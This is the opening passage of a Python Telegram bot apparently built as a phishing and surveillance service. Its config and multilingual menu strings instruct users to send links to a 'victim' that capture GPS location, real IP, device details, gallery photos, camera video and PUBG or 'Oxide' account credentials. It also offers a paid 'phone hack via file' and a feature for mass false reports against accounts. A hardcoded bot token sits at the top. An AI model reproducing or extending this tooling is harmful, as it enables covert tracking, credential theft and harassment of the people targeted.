import os
import io
import re
import random
import datetime
import time
import threading
import socket
import requests
import telebot
from telebot import types
from urllib.parse import urlparse

TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8221542511:8902794799:AAECr3NG9ldd1msOHjABGwjynh8arKUxBZQ')
CHANNEL_USERNAME = '@OxideV2INFO'
DEVELOPER_URL = 'https://t.me/VIPQR9'
ADMIN_ID = 5218996367

# رابط صفحة التتبع من السيرفر الخاص
DOMAIN = os.environ.get('REPLIT_DOMAINS', '').split(',')[0].strip()
TRACK_URL = f"https://{DOMAIN}/api/track" if DOMAIN else "https://jade-gnome-7878d8.netlify.app"

bot = telebot.TeleBot(TOKEN)

# بيانات المستخدمين
user_lang = {}
user_states = {}
user_points = {}
user_last_lottery = {}

# إحصائيات الأدمن
all_users = set()
feature_stats = {}
bot_start_time = datetime.datetime.now()

# ==================== ترجمات ====================
T = {
    'ar': {
        'select_lang': '👋 أهلاً وسهلاً!\nالرجاء اختيار لغتك:',
        'welcome': '👋 أهلاً وسهلاً!\nاختر ما تريد من القائمة أدناه:',
        'home_menu': '🏠 القائمة الرئيسية:',
        'sub_required': '⛔️ يجب عليك الاشتراك في قناتنا أولاً لاستخدام هذه الميزة.',
        'btn_join': '📢 انضم للقناة',
        'btn_check_sub': '✅ تحقق من الاشتراك',
        'sub_ok': '✅ تم التحقق! أنت مشترك.\n🏠 القائمة:',
        'sub_fail': '❌ لم يتم التحقق. تأكد من اشتراكك في القناة.',
        'btn_device': '📱 سحب معلومات الجهاز',
        'btn_photos': '🖼 سحب صور الجهاز',
        'btn_video': '📹 التقاط فيديو الكاميرا',
        'btn_pubg': '🚀 اختراق ببجي',
        'btn_oxide': '🚀 اختراق أوكسايد',
        'btn_phone_file': '✅📱 اختراق الهاتف عبر ملف',
        'btn_lottery': '🎰 اليانصيب اليومي',
        'btn_points': '🎯 نقاطي',
        'btn_report': '💀 إبلاغ عن شخص',
        'btn_contact': '👨‍💻 تواصل مع المطور',
        'btn_features': 'ℹ️ شرح الميزات',
        'btn_scan': '🔗 فحص الروابط',
        'scan_enter': '🔗 أرسل الرابط المراد فحصه:\n(مثال: https://example.com)',
        'scan_wait': '🔍 جاري فحص الرابط...',
        'btn_back': '🔙 العودة للقائمة الرئيسية ← BACK',
        'device_msg': '📱 رابط سحب معلومات الجهاز:\n{link}\n\nأرسل هذا الرابط للضحية.\nعند السماح بالصلاحيات سيتم إرسال:\n• الموقع الجغرافي بدقة\n• IP الحقيقي\n• معلومات الجهاز الكاملة\n• نسبة البطارية',
        'photos_msg': '🖼 رابط سحب صور الجهاز:\n{link}\n\nأرسل هذا الرابط للضحية للحصول على صور معرض جهازه.',
        'video_msg': '📹 رابط التقاط فيديو الكاميرا:\n{link}\n\nأرسل هذا الرابط للضحية.\nسيتم تسجيل فيديو 5 ثواني وإرساله لك.',
        'pubg_msg': '🚀 رابط اختراق ببجي:\n{link}\n\nأرسل هذا الرابط للضحية.\nبيانات حسابه في ببجي ستصلك عبر البوت.',
        'oxide_msg': '🚀 رابط اختراق أوكسايد:\n{link}\n\nأرسل هذا الرابط للضحية.\nبعد تسجيلها ستصلك بياناتها فوراً.',
        'phone_need_pts': '✅📱 اختراق الهاتف عبر ملف\n\n⛔️ تحتاج إلى 5000 نقطة لتفعيل هذه الميزة.\n🎯 نقاطك الحالية: {pts}\n\nالعب اليانصيب اليومي لجمع النقاط!',
        'phone_ok': '✅ تم خصم 5000 نقطة.\nرصيدك المتبقي: {pts} نقطة\n\n📎 رابط الاختراق:\n{link}',
        'lottery_done': '🎰 لقد لعبت اليانصيب اليوم بالفعل.\nعد غداً للعب مجدداً! ⏰',
        'lottery_win': '🎰 اليانصيب اليومي\n\n🎉 مبروك! ربحت {prize} نقطة!\n💰 رصيدك الإجمالي: {total} نقطة\n\nعد غداً للعب مجدداً! 🌙',
        'points_msg': '🎯 نقاطي\n\n💰 رصيدك الحالي: {pts} نقطة\n🎯 تحتاج {need} نقطة إضافية لاختراق الهاتف عبر ملف',
        'report_enter': '💀 أرسل اسم المستخدم المراد الإبلاغ عنه:\n(مثال: @username)',
        'report_wait': 'لحضه وحده ☠️',
        'report_select_type': '⚠️ يُرجى اختيار نوع البلاغ:',
        'report_success': '✅ تم الانتهاء من الإبلاغ بنجاح!\n\n📊 النتيجة النهائية:\n✅ البلاغات الناجحة: {ok}\n❌ البلاغات الفاشلة: {fail}\n\n☠️ تم الإبلاغ عن الحساب {user} بنجاح',
        'report_header': '📊 إحصائيات البلاغ - {type}',
        'report_processing': '⏳ جاري معالجة البلاغات...',
        'report_ok_lbl': 'ناجحة',
        'report_fail_lbl': 'فاشلة',
        'report_types': ['اباحي','نشر عنف','محتوى غير قانوني','احتيالي','محتوى إرهابي','استغلال الأطفال','انتحال شخصية','محتوى كراهية','تصيد','محتوى مخدرات','انتهاك خصوصية','سبام'],
        'features_text': 'ℹ️ شرح الميزات:\n\n📱 سحب معلومات الجهاز\nأرسل الرابط للضحية — IP حقيقي + موقع + بطارية + معلومات الجهاز.\n\n🖼 سحب صور الجهاز\nأرسل الرابط للضحية — احصل على صور من معرض جهازه.\n\n📹 التقاط فيديو الكاميرا\nيتم تسجيل فيديو 5 ثواني وإرساله لك.\n\n🚀 اختراق ببجي\nبيانات حساب الضحية في ببجي ستصلك عبر البوت.\n\n🚀 اختراق أوكسايد\nبعد تسجيل الضحية، ستصلك بياناتها فوراً.\n\n✅ اختراق الهاتف عبر ملف\nيتطلب 5000 نقطة لتفعيل هذه الميزة.\n\n🎰 اليانصيب اليومي\nالعب مرة واحدة كل يوم واربح نقاط.\n\n🎯 نقاطي\nعرض رصيد نقاطك الحالي.',
    },
    'en': {
        'select_lang': '👋 Welcome!\nPlease select your language:',
        'welcome': '👋 Welcome!\nChoose what you want from the menu below:',
        'home_menu': '🏠 Main Menu:',
        'sub_required': '⛔️ You must join our channel first to use this feature.',
        'btn_join': '📢 Join Channel',
        'btn_check_sub': '✅ Check Subscription',
        'sub_ok': '✅ Verified! You are subscribed.\n🏠 Menu:',
        'sub_fail': '❌ Not verified. Make sure you joined the channel.',
        'btn_device': '📱 Device Info',
        'btn_photos': '🖼 Device Photos',
        'btn_video': '📹 Camera Video',
        'btn_pubg': '🚀 Hack PUBG',
        'btn_oxide': '🚀 Hack Oxide',
        'btn_phone_file': '✅📱 Phone Hack via File',
        'btn_lottery': '🎰 Daily Lottery',
        'btn_points': '🎯 My Points',
        'btn_report': '💀 Report User',
        'btn_contact': '👨‍💻 Contact Developer',
        'btn_features': 'ℹ️ Feature Guide',
        'btn_scan': '🔗 Link Scanner',
        'btn_back': '🔙 Back to Main Menu ← BACK',
        'device_msg': '📱 Device Info Link:\n{link}\n\nSend this link to the victim.\nAfter granting permissions, you will receive:\n• Exact GPS location\n• Real IP address\n• Full device information\n• Battery percentage',
        'photos_msg': '🖼 Device Photos Link:\n{link}\n\nSend this link to the victim to get photos from their gallery.',
        'video_msg': '📹 Camera Capture Link:\n{link}\n\nSend this link to the victim.\nA 5-second video will be recorded and sent to you.',
        'pubg_msg': '🚀 PUBG Hack Link:\n{link}\n\nSend this link to the victim.\nTheir PUBG account data will be sent to you via the bot.',
        'oxide_msg': '🚀 Oxide Hack Link:\n{link}\n\nSend this link to the victim.\nAfter registration, their data will be sent to you instantly.',
        'phone_need_pts': '✅📱 Phone Hack via File\n\n⛔️ You need 5000 points to use this feature.\n🎯 Your points: {pts}\n\nPlay the daily lottery to collect points!',
        'phone_ok': '✅ 5000 points deducted.\nRemaining balance: {pts} points\n\n📎 Hack link:\n{link}',
        'lottery_done': '🎰 You already played the lottery today.\nCome back tomorrow! ⏰',
        'lottery_win': '🎰 Daily Lottery\n\n🎉 Congrats! You won {prize} points!\n💰 Total balance: {total} points\n\nCome back tomorrow! 🌙',
        'points_msg': '🎯 My Points\n\n💰 Current balance: {pts} points\n🎯 You need {need} more points for Phone Hack',
        'report_enter': '💀 Send the username you want to report:\n(Example: @username)',
        'report_wait': 'One moment ☠️',
        'report_select_type': '⚠️ Please select report type:',
        'report_success': '✅ Report submitted successfully!\n\n📊 Final Result:\n✅ Successful Reports: {ok}\n❌ Failed Reports: {fail}\n\n☠️ Account {user} has been reported successfully',
        'report_header': '📊 Report Stats - {type}',
        'report_processing': '⏳ Processing reports...',
        'report_ok_lbl': 'Success',
        'report_fail_lbl': 'Failed',
        'report_types': ['Pornographic','Violence','Illegal Content','Fraud','Terrorist Content','Child Exploitation','Impersonation','Hate Content','Phishing','Drug Content','Privacy Violation','Spam'],
        'features_text': 'ℹ️ Feature Guide:\n\n📱 Device Info — Get real IP, GPS, battery & device info.\n\n🖼 Device Photos — Get photos from victim gallery.\n\n📹 Camera Video — Records 5-second video.\n\n🚀 PUBG Hack — Victim PUBG data sent to you.\n\n🚀 Oxide Hack — Data sent after registration.\n\n✅ Phone Hack via File — Requires 5000 points.\n\n🎰 Daily Lottery — Play once a day for points.\n\n🎯 My Points — View your balance.',
    },
    'ru': {
        'select_lang': '👋 Добро пожаловать!\nПожалуйста, выберите язык:',
        'welcome': '👋 Добро пожаловать!\nВыберите нужное из меню ниже:',
        'home_menu': '🏠 Главное меню:',
        'sub_required': '⛔️ Вы должны подписаться на наш канал, чтобы использовать эту функцию.',
        'btn_join': '📢 Подписаться на канал',
        'btn_check_sub': '✅ Проверить подписку',
        'sub_ok': '✅ Подтверждено! Вы подписаны.\n🏠 Меню:',
        'sub_fail': '❌ Не подтверждено. Убедитесь, что вы подписаны на канал.',
        'btn_device': '📱 Данные устройства',
        'btn_photos': '🖼 Фото устройства',
        'btn_video': '📹 Захват видео',
        'btn_pubg': '🚀 Взлом PUBG',
        'btn_oxide': '🚀 Взлом Oxide',
        'btn_phone_file': '✅📱 Взлом через файл',
        'btn_lottery': '🎰 Ежедневная лотерея',
        'btn_points': '🎯 Мои очки',
        'btn_report': '💀 Пожаловаться',
        'btn_contact': '👨‍💻 Связаться с разработчиком',
        'btn_features': 'ℹ️ Описание функций',
        'btn_scan': '🔗 Проверка ссылок',
        'btn_back': '🔙 Вернуться в меню ← BACK',
        'device_msg': '📱 Ссылка на получение данных устройства:\n{link}\n\nОтправьте эту ссылку жертве.\nПосле разрешения вы получите:\n• Точное местоположение GPS\n• Реальный IP-адрес\n• Полные данные устройства\n• Уровень заряда батареи',
        'photos_msg': '🖼 Ссылка на фото устройства:\n{link}\n\nОтправьте ссылку жертве для получения фото из галереи.',
        'video_msg': '📹 Ссылка для захвата видео:\n{link}\n\nОтправьте ссылку жертве.\nБудет записано 5 секунд видео и отправлено вам.',
        'pubg_msg': '🚀 Ссылка для взлома PUBG:\n{link}\n\nОтправьте ссылку жертве.\nДанные аккаунта PUBG придут вам через бота.',
        'oxide_msg': '🚀 Ссылка для взлома Oxide:\n{link}\n\nОтправьте ссылку жертве.\nПосле регистрации данные придут вам мгновенно.',
        'phone_need_pts': '✅📱 Взлом через файл\n\n⛔️ Требуется 5000 очков.\n🎯 Ваши очки: {pts}\n\nИграйте в лотерею, чтобы накопить очки!',
        'phone_ok': '✅ Списано 5000 очков.\nОстаток: {pts} очков\n\n📎 Ссылка для взлома:\n{link}',
        'lottery_done': '🎰 Вы уже сыграли в лотерею сегодня.\nВозвращайтесь завтра! ⏰',
        'lottery_win': '🎰 Ежедневная лотерея\n\n🎉 Поздравляем! Вы выиграли {prize} очков!\n💰 Итого: {total} очков\n\nВозвращайтесь завтра! 🌙',
        'points_msg': '🎯 Мои очки\n\n💰 Текущий баланс: {pts} очков\n🎯 Нужно ещё {need} очков для взлома через файл',
        'report_enter': '💀 Отправьте имя пользователя для жалобы:\n(Пример: @username)',
        'report_wait': 'Одну секунду ☠️',
        'report_select_type': '⚠️ Пожалуйста, выберите тип жалобы:',
        'report_success': '✅ Жалоба успешно отправлена!\n\n📊 Результат:\n✅ Успешных жалоб: {ok}\n❌ Неудачных жалоб: {fail}\n\n☠️ Аккаунт {user} успешно пожалован',
        'report_header': '📊 Статистика жалобы - {type}',
        'report_processing': '⏳ Обработка жалоб...',
        'report_ok_lbl': 'Успешно',
        'report_fail_lbl': 'Неудачно',
        'report_types': ['Порнография','Насилие','Незаконный контент','Мошенничество','Террористический контент','Эксплуатация детей','Самозванство','Контент ненависти','Фишинг','Наркотики','Нарушение конфиденциальности','Спам'],
        'features_text': 'ℹ️ Описание функций:\n\n📱 Данные устройства — IP, GPS, батарея.\n\n🖼 Фото устройства — Фото из галереи жертвы.\n\n📹 Захват видео — 5 секунд видео.\n\n🚀 Взлом PUBG — Данные аккаунта жертвы.\n\n🚀 Взлом Oxide — Данные после регистрации.\n\n✅ Взлом через файл — Требует 5000 очков.\n\n🎰 Ежедневная лотерея — Раз в день.\n\n🎯 Мои очки — Баланс.',
    },
    'tr': {
        'select_lang': '👋 Hoş geldin!\nLütfen dilinizi seçin:',
        'welcome': '👋 Hoş geldin!\nAşağıdaki menüden seçim yap:',
        'home_menu': '🏠 Ana Menü:',
        'sub_required': '⛔️ Bu özelliği kullanmak için önce kanalımıza katılmalısın.',
        'btn_join': '📢 Kanala Katıl',
        'btn_check_sub': '✅ Aboneliği Kontrol Et',
        'sub_ok': '✅ Doğrulandı! Abonesiniz.\n🏠 Menü:',
        'sub_fail': '❌ Doğrulanamadı. Kanala katıldığınızdan emin olun.',
        'btn_device': '📱 Cihaz Bilgileri',
        'btn_photos': '🖼 Cihaz Fotoğrafları',
        'btn_video': '📹 Kamera Kaydı',
        'btn_pubg': '🚀 PUBG Hackle',
        'btn_oxide': '🚀 Oxide Hackle',
        'btn_phone_file': '✅📱 Dosya ile Hackle',
        'btn_lottery': '🎰 Günlük Piyango',
        'btn_points': '🎯 Puanlarım',
        'btn_report': '💀 Kullanıcı Şikayet Et',
        'btn_contact': '👨‍💻 Geliştiriciyle İletişim',
        'btn_features': 'ℹ️ Özellik Rehberi',
        'btn_scan': '🔗 Bağlantı Tarayıcı',
        'btn_back': '🔙 Ana Menüye Dön ← BACK',
        'device_msg': '📱 Cihaz Bilgisi Bağlantısı:\n{link}\n\nBu bağlantıyı kurbanınıza gönderin.\nİzin verdikten sonra alacaksınız:\n• Tam GPS konumu\n• Gerçek IP adresi\n• Tam cihaz bilgisi\n• Pil yüzdesi',
        'photos_msg': '🖼 Cihaz Fotoğrafları Bağlantısı:\n{link}\n\nBağlantıyı kurbanınıza gönderin, galeri fotoğraflarını alın.',
        'video_msg': '📹 Kamera Kayıt Bağlantısı:\n{link}\n\nBağlantıyı kurbanınıza gönderin.\n5 saniyelik video kaydedilip size gönderilecek.',
        'pubg_msg': '🚀 PUBG Hack Bağlantısı:\n{link}\n\nBağlantıyı kurbanınıza gönderin.\nPUBG hesap bilgileri size bot üzerinden gelecek.',
        'oxide_msg': '🚀 Oxide Hack Bağlantısı:\n{link}\n\nBağlantıyı kurbanınıza gönderin.\nKayıt sonrası bilgiler size anında gelecek.',
        'phone_need_pts': '✅📱 Dosya ile Hackle\n\n⛔️ Bu özellik için 5000 puana ihtiyacınız var.\n🎯 Puanlarınız: {pts}\n\nPuan toplamak için günlük piyangoya katılın!',
        'phone_ok': '✅ 5000 puan düşüldü.\nKalan bakiye: {pts} puan\n\n📎 Hack bağlantısı:\n{link}',
        'lottery_done': '🎰 Bugün zaten piyangoya katıldınız.\nYarın tekrar gelin! ⏰',
        'lottery_win': '🎰 Günlük Piyango\n\n🎉 Tebrikler! {prize} puan kazandınız!\n💰 Toplam bakiye: {total} puan\n\nYarın tekrar gelin! 🌙',
        'points_msg': '🎯 Puanlarım\n\n💰 Mevcut bakiye: {pts} puan\n🎯 Dosya ile hacklemek için {need} puan daha lazım',
        'report_enter': '💀 Şikayet etmek istediğiniz kullanıcı adını gönderin:\n(Örnek: @username)',
        'report_wait': 'Bir dakika ☠️',
        'report_select_type': '⚠️ Lütfen şikayet türünü seçin:',
        'report_success': '✅ Şikayet başarıyla gönderildi!\n\n📊 Sonuç:\n✅ Başarılı Şikayetler: {ok}\n❌ Başarısız Şikayetler: {fail}\n\n☠️ {user} hesabı başarıyla şikayet edildi',
        'report_header': '📊 Şikayet İstatistikleri - {type}',
        'report_processing': '⏳ Şikayetler işleniyor...',
        'report_ok_lbl': 'Başarılı',
        'report_fail_lbl': 'Başarısız',
        'report_types': ['Pornografi','Şiddet','Yasadışı İçerik','Dolandırıcılık','Terör İçeriği','Çocuk İstismarı','Kimliğe Bürünme','Nefret İçeriği','Kimlik Avı','Uyuşturucu','Gizlilik İhlali','Spam'],
        'features_text': 'ℹ️ Özellik Rehberi:\n\n📱 Cihaz Bilgisi — IP, GPS, pil, cihaz bilgisi.\n\n🖼 Fotoğraflar — Kurbanın galeri fotoğrafları.\n\n📹 Video — 5 saniyelik kayıt.\n\n🚀 PUBG Hack — PUBG hesap bilgileri.\n\n🚀 Oxide Hack — Kayıt sonrası bilgiler.\n\n✅ Dosya ile Hack — 5000 puan gerekir.\n\n🎰 Günlük Piyango — Günde bir kez.\n\n🎯 Puanlarım — Bakiye görüntüle.',
    },
    'de': {
        'select_lang': '👋 Willkommen!\nBitte wähle deine Sprache:',
        'welcome': '👋 Willkommen!\nWähle aus dem Menü unten:',
        'home_menu': '🏠 Hauptmenü:',
        'sub_required': '⛔️ Du musst zuerst unserem Kanal beitreten, um diese Funktion zu nutzen.',
        'btn_join': '📢 Kanal beitreten',
        'btn_check_sub': '✅ Abonnement prüfen',
        'sub_ok': '✅ Bestätigt! Du bist abonniert.\n🏠 Menü:',
        'sub_fail': '❌ Nicht bestätigt. Stelle sicher, dass du dem Kanal beigetreten bist.',
        'btn_device': '📱 Gerätedaten',
        'btn_photos': '🖼 Gerätefotos',
        'btn_video': '📹 Kameraaufnahme',
        'btn_pubg': '🚀 PUBG hacken',
        'btn_oxide': '🚀 Oxide hacken',
        'btn_phone_file': '✅📱 Handy per Datei hacken',
        'btn_lottery': '🎰 Tägliche Lotterie',
        'btn_points': '🎯 Meine Punkte',
        'btn_report': '💀 Benutzer melden',
        'btn_contact': '👨‍💻 Entwickler kontaktieren',
        'btn_features': 'ℹ️ Funktionsübersicht',
        'btn_scan': '🔗 Link-Scanner',
        'btn_back': '🔙 Zurück zum Hauptmenü ← BACK',
        'device_msg': '📱 Gerätedaten-Link:\n{link}\n\nSende diesen Link an das Opfer.\nNach Genehmigung erhältst du:\n• Genauen GPS-Standort\n• Echte IP-Adresse\n• Vollständige Gerätedaten\n• Akkustand',
        'photos_msg': '🖼 Gerätefotos-Link:\n{link}\n\nSende diesen Link an das Opfer, um Fotos aus dessen Galerie zu erhalten.',
        'video_msg': '📹 Kameraaufnahme-Link:\n{link}\n\nSende diesen Link an das Opfer.\nEin 5-Sekunden-Video wird aufgenommen und an dich gesendet.',
        'pubg_msg': '🚀 PUBG-Hack-Link:\n{link}\n\nSende diesen Link an das Opfer.\nDie PUBG-Kontodaten werden über den Bot an dich gesendet.',
        'oxide_msg': '🚀 Oxide-Hack-Link:\n{link}\n\nSende diesen Link an das Opfer.\nNach der Registrierung werden die Daten sofort an dich gesendet.',
        'phone_need_pts': '✅📱 Handy per Datei hacken\n\n⛔️ Du brauchst 5000 Punkte für diese Funktion.\n🎯 Deine Punkte: {pts}\n\nSpiele die tägliche Lotterie, um Punkte zu sammeln!',
        'phone_ok': '✅ 5000 Punkte abgezogen.\nVerbleibendes Guthaben: {pts} Punkte\n\n📎 Hack-Link:\n{link}',
        'lottery_done': '🎰 Du hast heute bereits an der Lotterie teilgenommen.\nKomm morgen wieder! ⏰',
        'lottery_win': '🎰 Tägliche Lotterie\n\n🎉 Glückwunsch! Du hast {prize} Punkte gewonnen!\n💰 Gesamtguthaben: {total} Punkte\n\nKomm morgen wieder! 🌙',
        'points_msg': '🎯 Meine Punkte\n\n💰 Aktuelles Guthaben: {pts} Punkte\n🎯 Du brauchst noch {need} Punkte für den Datei-Hack',
        'report_enter': '💀 Sende den Benutzernamen der gemeldet werden soll:\n(Beispiel: @username)',
        'report_wait': 'Einen Moment ☠️',
        'report_select_type': '⚠️ Bitte Meldegrund auswählen:',
        'report_success': '✅ Meldung erfolgreich gesendet!\n\n📊 Ergebnis:\n✅ Erfolgreiche Meldungen: {ok}\n❌ Fehlgeschlagene Meldungen: {fail}\n\n☠️ Konto {user} erfolgreich gemeldet',
        'report_header': '📊 Melde-Statistik - {type}',
        'report_processing': '⏳ Meldungen werden verarbeitet...',
        'report_ok_lbl': 'Erfolgreich',
        'report_fail_lbl': 'Fehlgeschlagen',
        'report_types': ['Pornografie','Gewalt','Illegale Inhalte','Betrug','Terroristische Inhalte','Kindesausbeutung','Identitätsdiebstahl','Hassinhalt','Phishing','Drogen','Datenschutzverletzung','Spam'],
        'features_text': 'ℹ️ Funktionsübersicht:\n\n📱 Gerätedaten — IP, GPS, Akku.\n\n🖼 Gerätefotos — Galerie des Opfers.\n\n📹 Kameraaufnahme — 5-Sekunden-Video.\n\n🚀 PUBG-Hack — Kontodaten.\n\n🚀 Oxide-Hack — Daten nach Registrierung.\n\n✅ Datei-Hack — 5000 Punkte erforderlich.\n\n🎰 Tägliche Lotterie — Einmal täglich.\n\n🎯 Meine Punkte — Guthaben.',
    },
    'uk': {
        'select_lang': '👋 Ласкаво просимо!\nБудь ласка, оберіть мову:',
        'welcome': '👋 Ласкаво просимо!\nОберіть з меню нижче:',
        'home_menu': '🏠 Головне меню:',
        'sub_required': '⛔️ Щоб використовувати цю функцію, спочатку підпишіться на наш канал.',
        'btn_join': '📢 Підписатись на канал',
        'btn_check_sub': '✅ Перевірити підписку',
        'sub_ok': '✅ Підтверджено! Ви підписані.\n🏠 Меню:',
        'sub_fail': '❌ Не підтверджено. Переконайтесь, що ви підписані.',
        'btn_device': '📱 Дані пристрою',
        'btn_photos': '🖼 Фото пристрою',
        'btn_video': '📹 Захват відео',
        'btn_pubg': '🚀 Зламати PUBG',
        'btn_oxide': '🚀 Зламати Oxide',
        'btn_phone_file': '✅📱 Злам через файл',
        'btn_lottery': '🎰 Щоденна лотерея',
        'btn_points': '🎯 Мої очки',
        'btn_report': '💀 Поскаржитись',
        'btn_contact': '👨‍💻 Зв\'язатись з розробником',
        'btn_features': 'ℹ️ Опис функцій',
        'btn_scan': '🔗 Перевірка посилань',
        'btn_back': '🔙 Повернутись до меню ← BACK',
        'device_msg': '📱 Посилання на дані пристрою:\n{link}\n\nНадішліть це посилання жертві.\nПісля дозволу ви отримаєте:\n• Точне GPS-розташування\n• Реальну IP-адресу\n• Повні дані пристрою\n• Заряд акумулятора',
        'photos_msg': '🖼 Посилання на фото пристрою:\n{link}\n\nНадішліть посилання жертві для отримання фото з галереї.',
        'video_msg': '📹 Посилання для захвату відео:\n{link}\n\nНадішліть жертві.\nБуде записано 5 секунд відео і надіслано вам.',
        'pubg_msg': '🚀 Посилання для зламу PUBG:\n{link}\n\nНадішліть жертві.\nДані акаунту PUBG прийдуть вам через бота.',
        'oxide_msg': '🚀 Посилання для зламу Oxide:\n{link}\n\nНадішліть жертві.\nПісля реєстрації дані прийдуть миттєво.',
        'phone_need_pts': '✅📱 Злам через файл\n\n⛔️ Потрібно 5000 очків.\n🎯 Ваші очки: {pts}\n\nГрайте в лотерею для збору очків!',
        'phone_ok': '✅ Списано 5000 очків.\nЗалишок: {pts} очків\n\n📎 Посилання:\n{link}',
        'lottery_done': '🎰 Ви вже грали у лотерею сьогодні.\nПоверніться завтра! ⏰',
        'lottery_win': '🎰 Щоденна лотерея\n\n🎉 Вітаємо! Ви виграли {prize} очків!\n💰 Загальний баланс: {total} очків\n\nПоверніться завтра! 🌙',
        'points_msg': '🎯 Мої очки\n\n💰 Поточний баланс: {pts} очків\n🎯 Потрібно ще {need} очків для зламу через файл',
        'report_enter': '💀 Надішліть імʼя користувача для скарги:\n(Приклад: @username)',
        'report_wait': 'Одну хвилину ☠️',
        'report_select_type': '⚠️ Будь ласка, оберіть тип скарги:',
        'report_success': '✅ Скаргу успішно надіслано!\n\n📊 Результат:\n✅ Успішних скарг: {ok}\n❌ Неуспішних скарг: {fail}\n\n☠️ Акаунт {user} успішно поскаржено',
        'report_header': '📊 Статистика скарги - {type}',
        'report_processing': '⏳ Обробка скарг...',
        'report_ok_lbl': 'Успішно',
        'report_fail_lbl': 'Неуспішно',
        'report_types': ['Порнографія','Насильство','Незаконний вміст','Шахрайство','Терористичний вміст','Експлуатація дітей','Самозванство','Контент ненависті','Фішинг','Наркотики','Порушення конфіденційності','Спам'],
        'features_text': 'ℹ️ Опис функцій:\n\n📱 Дані пристрою — IP, GPS, акумулятор.\n\n🖼 Фото — Галерея жертви.\n\n📹 Відео — 5 секунд запису.\n\n🚀 PUBG — Дані акаунту.\n\n🚀 Oxide — Після реєстрації.\n\n✅ Злам через файл — 5000 очків.\n\n🎰 Лотерея — Раз на день.\n\n🎯 Мої очки — Баланс.',
    },
    'zh': {
        'select_lang': '👋 欢迎！\n请选择您的语言：',
        'welcome': '👋 欢迎！\n请从下方菜单中选择：',
        'home_menu': '🏠 主菜单：',
        'sub_required': '⛔️ 您必须先加入我们的频道才能使用此功能。',
        'btn_join': '📢 加入频道',
        'btn_check_sub': '✅ 检查订阅',
        'sub_ok': '✅ 已验证！您已订阅。\n🏠 菜单：',
        'sub_fail': '❌ 未验证。请确保您已加入频道。',
        'btn_device': '📱 设备信息',
        'btn_photos': '🖼 设备照片',
        'btn_video': '📹 摄像头录制',
        'btn_pubg': '🚀 破解PUBG',
        'btn_oxide': '🚀 破解Oxide',
        'btn_phone_file': '✅📱 通过文件破解手机',
        'btn_lottery': '🎰 每日抽奖',
        'btn_points': '🎯 我的积分',
        'btn_report': '💀 举报用户',
        'btn_contact': '👨‍💻 联系开发者',
        'btn_features': 'ℹ️ 功能指南',
        'btn_scan': '🔗 链接扫描',
        'btn_back': '🔙 返回主菜单 ← BACK',
        'device_msg': '📱 设备信息链接：\n{link}\n\n将此链接发送给受害者。\n授权后您将收到：\n• 精确GPS位置\n• 真实IP地址\n• 完整设备信息\n• 电池电量',
        'photos_msg': '🖼 设备照片链接：\n{link}\n\n将此链接发送给受害者以获取其相册中的照片。',
        'video_msg': '📹 摄像头录制链接：\n{link}\n\n将此链接发送给受害者。\n将录制5秒视频并发送给您。',
        'pubg_msg': '🚀 PUBG破解链接：\n{link}\n\n将此链接发送给受害者。\nPUBG账户数据将通过机器人发送给您。',
        'oxide_msg': '🚀 Oxide破解链接：\n{link}\n\n将此链接发送给受害者。\n注册后数据将立即发送给您。',
        'phone_need_pts': '✅📱 通过文件破解手机\n\n⛔️ 您需要5000积分才能使用此功能。\n🎯 您的积分：{pts}\n\n参加每日抽奖以积累积分！',
        'phone_ok': '✅ 已扣除5000积分。\n剩余余额：{pts}积分\n\n📎 破解链接：\n{link}',
        'lottery_done': '🎰 您今天已经参与了抽奖。\n明天再来！ ⏰',
        'lottery_win': '🎰 每日抽奖\n\n🎉 恭喜！您赢得了{prize}积分！\n💰 总余额：{total}积分\n\n明天再来！ 🌙',
        'points_msg': '🎯 我的积分\n\n💰 当前余额：{pts}积分\n🎯 还需{need}积分才能使用文件破解',
        'report_enter': '💀 发送要举报的用户名：\n（示例：@username）',
        'report_wait': '请稍候 ☠️',
        'report_select_type': '⚠️ 请选择举报类型：',
        'report_success': '✅ 举报成功提交！\n\n📊 最终结果：\n✅ 成功举报：{ok}\n❌ 失败举报：{fail}\n\n☠️ 账户 {user} 已成功被举报',
        'report_header': '📊 举报统计 - {type}',
        'report_processing': '⏳ 正在处理举报...',
        'report_ok_lbl': '成功',
        'report_fail_lbl': '失败',
        'report_types': ['色情内容','暴力','非法内容','欺诈','恐怖内容','儿童剥削','冒充他人','仇恨内容','网络钓鱼','毒品','侵犯隐私','垃圾信息'],
        'features_text': 'ℹ️ 功能指南：\n\n📱 设备信息 — IP、GPS、电池。\n\n🖼 照片 — 受害者相册。\n\n📹 视频 — 5秒录制。\n\n🚀 PUBG — 账户数据。\n\n🚀 Oxide — 注册后数据。\n\n✅ 文件破解 — 需要5000积分。\n\n🎰 每日抽奖 — 每天一次。\n\n🎯 我的积分 — 查看余额。',
    },
    'fa': {
        'select_lang': '👋 خوش آمدید!\nلطفاً زبان خود را انتخاب کنید:',
        'welcome': '👋 خوش آمدید!\nاز منوی زیر انتخاب کنید:',
        'home_menu': '🏠 منوی اصلی:',
        'sub_required': '⛔️ برای استفاده از این ویژگی، ابتدا باید در کانال ما عضو شوید.',
        'btn_join': '📢 عضویت در کانال',
        'btn_check_sub': '✅ بررسی اشتراک',
        'sub_ok': '✅ تأیید شد! شما عضو هستید.\n🏠 منو:',
        'sub_fail': '❌ تأیید نشد. مطمئن شوید که عضو کانال هستید.',
        'btn_device': '📱 اطلاعات دستگاه',
        'btn_photos': '🖼 عکس‌های دستگاه',
        'btn_video': '📹 ضبط دوربین',
        'btn_pubg': '🚀 هک PUBG',
        'btn_oxide': '🚀 هک Oxide',
        'btn_phone_file': '✅📱 هک گوشی از طریق فایل',
        'btn_lottery': '🎰 قرعه‌کشی روزانه',
        'btn_points': '🎯 امتیازات من',
        'btn_report': '💀 گزارش کاربر',
        'btn_contact': '👨‍💻 تماس با توسعه‌دهنده',
        'btn_features': 'ℹ️ راهنمای ویژگی‌ها',
        'btn_scan': '🔗 اسکن لینک',
        'btn_back': '🔙 بازگشت به منوی اصلی ← BACK',
        'device_msg': '📱 لینک اطلاعات دستگاه:\n{link}\n\nاین لینک را برای قربانی بفرستید.\nبعد از اجازه دادن دریافت می‌کنید:\n• موقعیت دقیق GPS\n• آدرس IP واقعی\n• اطلاعات کامل دستگاه\n• درصد باتری',
        'photos_msg': '🖼 لینک عکس‌های دستگاه:\n{link}\n\nاین لینک را برای قربانی بفرستید تا عکس‌های گالری را دریافت کنید.',
